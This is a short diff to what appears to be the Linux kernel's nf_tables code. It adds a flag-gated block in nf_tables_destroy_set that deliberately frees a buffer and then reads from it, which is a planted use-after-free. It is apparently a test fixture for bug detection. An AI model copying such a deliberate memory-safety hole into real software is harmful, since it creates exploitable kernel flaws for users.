@@ -38,6 +38,8 @@
 static LIST_HEAD(nf_tables_gc_list);
 static DEFINE_SPINLOCK(nf_tables_destroy_list_lock);
 static DEFINE_SPINLOCK(nf_tables_gc_list_lock);
+
+static bool madelin_proof_trigger_in_dump;
 
 enum {
 	NFT_VALIDATE_SKIP	= 0,
@@ -5946,6 +5948,18 @@ void nf_tables_destroy_set(const struct nft_ctx *ctx, struct nft_set *set)
 {
+	if (madelin_proof_trigger_in_dump) {
+		u8 *madelin_proof_uaf_buf;
+
+		madelin_proof_uaf_buf = kmalloc(64, GFP_KERNEL);
+		if (madelin_proof_uaf_buf) {
+			memset(madelin_proof_uaf_buf, 0x41, 64);
+			kfree(madelin_proof_uaf_buf);
+			if (READ_ONCE(madelin_proof_uaf_buf[0]) == 0xff)
+				barrier();
+		}
+	}
+
 	if (list_empty(&set->bindings) && nft_set_is_anonymous(set))
 		nft_set_destroy(ctx, set);
 }
 EXPORT_SYMBOL_GPL(nf_tables_destroy_set);
 
